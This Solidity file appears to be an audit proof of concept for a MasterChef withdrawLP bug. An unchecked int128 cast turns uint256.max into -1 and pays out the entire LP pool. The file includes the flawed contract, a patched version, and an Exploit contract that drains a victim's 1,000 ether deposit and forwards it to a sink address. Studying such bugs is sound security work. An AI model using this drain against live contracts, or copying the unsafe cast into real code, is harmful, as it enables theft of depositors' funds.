// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// AuditVault 51368 - Entangle MasterChef.withdrawLP.
// int128(int256(uint256.max)) is -1. A negative cast pays totalLp to the caller.
// The published PoC passes uint256.max and the chef LP balance becomes 0.
// With a second depositor that pays out their 1,000 ether as well.

contract ERC20Mini {
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address f, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[f][msg.sender];
        if (a != type(uint256).max) allowance[f][msg.sender] = a - amt;
        balanceOf[f] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract MasterChef {
    ERC20Mini public lp;
    uint256 public totalLp;
    mapping(address => uint256) public deposits;
    int256 public lastCast;

    constructor(ERC20Mini _lp) {
        lp = _lp;
    }

    function deposit(uint256 amount) external {
        lp.transferFrom(msg.sender, address(this), amount);
        deposits[msg.sender] += amount;
        totalLp += amount;
    }

    function withdrawLP(uint256 amount, address to) external {
        uint256 poolBefore = totalLp; // S:before
        // @> VULN: uint256.max truncates through int256 to int128(-1)
        int256 casted = int256(int128(int256(amount))); // S:vuln
        lastCast = casted; // S:store
        uint256 pay = casted < 0 ? poolBefore : uint256(casted); // S:pay
        if (casted >= 0) {
            require(pay <= deposits[msg.sender], "exceeds deposit");
            deposits[msg.sender] -= pay;
        }
        totalLp = poolBefore - pay; // S:left
        lp.transfer(to, pay); // S:send
    }
}

contract MasterChefFixed {
    ERC20Mini public lp;
    uint256 public totalLp;
    mapping(address => uint256) public deposits;

    constructor(ERC20Mini _lp) {
        lp = _lp;
    }

    function deposit(uint256 amount) external {
        lp.transferFrom(msg.sender, address(this), amount);
        deposits[msg.sender] += amount;
        totalLp += amount;
    }

    function withdrawLP(uint256 amount, address to) external {
        require(amount <= uint256(uint128(type(int128).max)), "SafeCast");
        require(amount <= deposits[msg.sender], "exceeds deposit");
        deposits[msg.sender] -= amount;
        totalLp -= amount;
        lp.transfer(to, amount);
    }
}

contract LpDepositor {
    function deposit(MasterChef chef, ERC20Mini token, uint256 amt) external {
        token.approve(address(chef), amt);
        chef.deposit(amt);
    }

    function depositFixed(MasterChefFixed chef, ERC20Mini token, uint256 amt) external {
        token.approve(address(chef), amt);
        chef.deposit(amt);
    }
}

contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 public constant VICTIM_LP = 1000 ether;

    ERC20Mini public lp;
    MasterChef public chef;
    LpDepositor public victim;
    uint256 public stolen;

    function run() external {
        lp = new ERC20Mini("LP");
        chef = new MasterChef(lp);
        victim = new LpDepositor();

        lp.mint(address(this), 1 ether);
        lp.mint(address(victim), VICTIM_LP);
        lp.approve(address(chef), 1 ether);
        chef.deposit(1 ether);
        victim.deposit(chef, lp, VICTIM_LP);

        chef.withdrawLP(type(uint256).max, address(this));
        require(lp.balanceOf(address(this)) == 1001 ether, "drained");
        require(chef.totalLp() == 0, "empty");
        stolen = VICTIM_LP;
        lp.transfer(SINK, stolen);
    }
}
